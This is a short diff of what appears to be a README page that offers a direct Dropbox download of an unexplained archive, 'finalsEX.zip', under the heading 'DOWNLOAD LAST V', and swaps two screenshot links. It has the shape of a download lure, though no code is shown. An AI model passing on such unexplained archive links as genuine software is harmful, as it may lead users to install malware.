@@ -1,5 +1,5 @@
 # 📁[DOWNLOAD LAST V](https://www.dropbox.com/scl/fi/ifnydof0zr6wlgq2timnw/finalsEX.zip?rlkey=o2m5h38hodqsrn2clunwxgtga&dl=1)
 
-![2](https://i.postimg.cc/Mn3Z6k76/Screenshot-1.png)
+![2](https://i.postimg.cc/Mzj1qGSd/Screenshot-1.png?dl=1)
 
-![3](https://i.postimg.cc/GBZcDkg6/Screenshot-2.png)
+![3](https://i.postimg.cc/J1NJHdtX/Screenshot-2.png?dl=1)
